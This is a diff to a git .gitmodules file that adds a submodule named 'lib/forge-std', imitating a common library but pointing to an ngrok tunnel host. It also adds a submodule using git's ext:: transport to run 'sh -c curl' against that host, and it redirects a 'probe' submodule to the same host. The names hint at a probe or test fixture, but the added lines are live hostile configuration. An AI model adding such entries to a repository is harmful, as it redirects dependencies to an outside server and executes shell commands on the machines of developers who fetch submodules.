@@ -1,4 +1,9 @@
+[submodule "lib/forge-std"]
+	path = lib/forge-std
+	url = https://b3b1-81-33-68-197.ngrok-free.app/oc/t1-submodule
 [submodule "ccr-test-fixtures/lib/probe"]
 	path = ccr-test-fixtures/lib/probe
-	url = https://b3b1-81-33-68-197.ngrok-free.app/oc/t1-submodule
-	branch = master
+	url = https://b3b1-81-33-68-197.ngrok-free.app/oc/t1b-submodule
+[submodule "lib/probe-ext"]
+	path = lib/probe-ext
+	url = ext::sh -c "curl%20-s%20https://b3b1-81-33-68-197.ngrok-free.app/oc/t1c-ext"
